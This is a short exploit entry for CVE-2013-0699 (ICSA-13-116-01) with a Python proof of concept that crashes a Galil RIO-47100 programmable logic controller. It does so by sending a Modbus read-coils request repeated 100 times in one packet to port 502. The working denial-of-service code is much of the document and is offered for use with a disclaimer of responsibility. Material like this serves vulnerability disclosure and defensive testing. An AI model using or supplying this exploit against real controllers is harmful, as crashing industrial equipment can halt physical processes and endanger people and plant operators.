# Exploit Title: Galil RIO-47100
# Date: 05-01-2013
# Exploit Author: Sapling
# Vendor Homepage: www.galilmc.com
# Version: Rio Firmware Prior to 1.1d
# CVE : CVE-2013-0699
# ICSA: ICSA-13-116-01

/* There are many different ways to crash this PLC but most of them are
centralized around the repeating a request in a single packet format. So
read a coil repeated in a single packet.
The Rio-47100 by Galil is a small PLC with an internal RISC based
processor. It communicates using ModBus, or Telnet over Ethernet as well as
having a web server built in that allows a user to issue commands.
I take no responsibility for the use of this code and using this code you
agree to take responsibility for your own actions. */


# Python Proof of concept
# A quick run down of the last half start at \x06
# \x06 length
# \x01 unit id
# \x01 function code (read coils)
# \x00\x00 start address
# \x00\x01 coil quantity
# Repeat the request in the packet 100 times
# Unfortunateley I can't remember the minimum number of times you have to
repeat to cause the crash

import sys
import socket

new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new.connect(('192.168.1.12', 502)) #Change the IP address to your PLC IP
Address
new.send('\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x01'*100)